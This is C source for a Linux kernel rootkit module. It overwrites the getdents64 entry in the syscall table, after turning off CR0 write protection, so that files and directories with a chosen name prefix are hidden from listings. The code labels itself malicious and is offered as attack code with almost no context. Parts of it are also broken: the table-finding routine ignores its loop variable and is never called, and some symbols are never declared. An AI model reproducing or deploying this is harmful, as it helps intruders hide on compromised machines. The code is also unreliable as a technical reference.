// Modern kernels hide the sys_call_table symbol. This technique finds it
// by scanning memory for the syscall entry point pattern.
static unsigned long *syscall_table;

static unsigned long find_syscall_table(void) {
    unsigned long offset = 0, ptr;
    for (offset = 0; offset < 1024*1024; offset += sizeof(void *)) {
        ptr = kallsyms_lookup_name("sys_close");  // Known syscall
        if (ptr && *(unsigned long *)ptr == SYSCALL_TABLE_PATTERN) {
            return ptr - (__NR_close * sizeof(void *));
        }
    }
    return 0;
}

// Our malicious function that hides files/directories
asmlinkage int evil_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = original_getdents64(fd, dirp, count);  // Call original
    struct linux_dirent64 *d = dirp;
    struct linux_dirent64 *prev = NULL;
    char *pos = (char *)dirp;
    
    while (pos < (char *)dirp + ret) {
        d = (struct linux_dirent64 *)pos;
        
        // Check if this entry is the hidden file/directory
        if (strstr(d->d_name, HIDE_PREFIX) == d->d_name) {
            // Remove it from the list: combine with previous entry
            if (prev) {
                prev->d_reclen += d->d_reclen;
            } else {
                // It's the first entry - shift everything forward
                memmove(pos, pos + d->d_reclen, ret - (pos - (char *)dirp) - d->d_reclen);
                ret -= d->d_reclen;
                continue;
            }
        } else {
            prev = d;
        }
        pos += d->d_reclen;
    }
    return ret;
}

static int __init rootkit_init(void) {
    // Disable write protection (CR0.WP bit)
    write_cr0(read_cr0() & (~WP_BIT));
    
    // Save original and hijack the syscall
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)evil_getdents64;
    
    // Re-enable write protection
    write_cr0(read_cr0() | WP_BIT);
    return 0;
}

module_init(rootkit_init);
